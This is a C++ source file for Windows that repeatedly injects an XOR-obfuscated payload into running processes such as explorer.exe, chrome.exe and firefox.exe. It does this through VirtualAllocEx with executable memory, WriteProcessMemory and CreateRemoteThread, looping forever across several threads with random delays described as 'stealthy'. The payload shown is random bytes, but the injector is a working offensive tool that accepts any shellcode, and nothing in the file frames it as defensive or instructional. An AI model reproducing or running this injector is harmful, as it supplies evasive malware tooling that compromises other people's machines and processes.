#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <random>
#include <chrono>
#include <mutex>
#include <atomic>
#include <sstream>
#include <fstream>

// XOR Encryption/Decryption Utility
class CryptoUtils {
public:
    static std::string xor_encrypt_decrypt(const std::string& data, const std::string& key) {
        std::string result(data);
        for (size_t i = 0; i < data.size(); ++i) {
            result[i] ^= key[i % key.size()];
        }
        return result;
    }

    static std::string encrypt(const std::string& data, const std::string& key) {
        return xor_encrypt_decrypt(data, key);
    }

    static std::string decrypt(const std::string& data, const std::string& key) {
        return xor_encrypt_decrypt(data, key);
    }
};

// Process Injection Class
class Injector {
public:
    Injector() {
        // Define a list of target processes to inject into
        target_processes = { "explorer.exe", "chrome.exe", "firefox.exe", "notepad.exe", "msedge.exe", "cmd.exe" };
    }

    // Check if the process is running
    bool is_process_running(const std::string& process_name) {
        PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &entry)) {
            do {
                if (process_name == entry.szExeFile) {
                    CloseHandle(snapshot);
                    return true;
                }
            } while (Process32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);
        return false;
    }

    // Inject the payload into the target process
    bool inject_into_process(const std::string& payload, const std::string& target_process) {
        PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &entry)) {
            do {
                if (target_process == entry.szExeFile) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                    if (hProcess) {
                        void* mem = VirtualAllocEx(hProcess, nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (mem) {
                            WriteProcessMemory(hProcess, mem, payload.c_str(), payload.size(), nullptr);
                            HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
                            if (hThread) {
                                CloseHandle(hThread);
                                CloseHandle(hProcess);
                                CloseHandle(snapshot);
                                return true;
                            }
                        }
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);
        return false;
    }

    // Perform injection into multiple processes in a stealthy manner
    void inject_into_multiple_processes(const std::string& payload) {
        while (true) {
            for (const auto& process : target_processes) {
                if (is_process_running(process)) {
                    std::cout << "Injecting into " << process << "...\n";
                    if (inject_into_process(payload, process)) {
                        std::cout << "Injection successful into " << process << "\n";
                    } else {
                        std::cout << "Failed to inject into " << process << "\n";
                    }
                }
            }

            // Sleep for a random amount of time before the next injection
            random_sleep(5000, 10000);  // Random delay between 5 and 10 seconds
        }
    }

private:
    std::vector<std::string> target_processes;

    // Random sleep time to inject stealthily
    void random_sleep(int min_ms, int max_ms) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(min_ms, max_ms);
        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    }

    // Retry mechanism with exponential backoff
    bool retry_inject(const std::string& payload, const std::string& target_process, int max_retries = 3) {
        int retries = 0;
        while (retries < max_retries) {
            if (inject_into_process(payload, target_process)) {
                return true;
            }
            retries++;
            std::cout << "Injection failed for " << target_process << ", retrying (" << retries << "/" << max_retries << ")\n";
            random_sleep(1000, 5000);  // Sleep between retries
        }
        return false;
    }
};

// Function to launch multiple threads for stealthier injections
void start_injection_threads(Injector& injector, const std::string& payload, int num_threads = 3) {
    std::vector<std::thread> threads;
    for (int i = 0; i < num_threads; ++i) {
        threads.push_back(std::thread(&Injector::inject_into_multiple_processes, &injector, payload));
    }

    for (auto& t : threads) {
        t.join();  // Join all threads
    }
}

// Function to generate a random payload (for demonstration purposes)
std::string generate_random_payload(int size) {
    std::string payload;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    for (int i = 0; i < size; ++i) {
        payload += static_cast<char>(dis(gen));
    }

    return payload;
}

// Main function
int main() {
    Injector injector;
    int payload_size = 1024;  // Size of the payload (can be adjusted)
    std::string payload = generate_random_payload(payload_size);  // Generate random payload

    // Optionally, encrypt the payload using XOR encryption
    std::string encryption_key = "secure_key";
    payload = CryptoUtils::encrypt(payload, encryption_key);

    std::cout << "Starting the injection process...\n";
    start_injection_threads(injector, payload);  // Start injecting in multiple threads
    return 0;
}
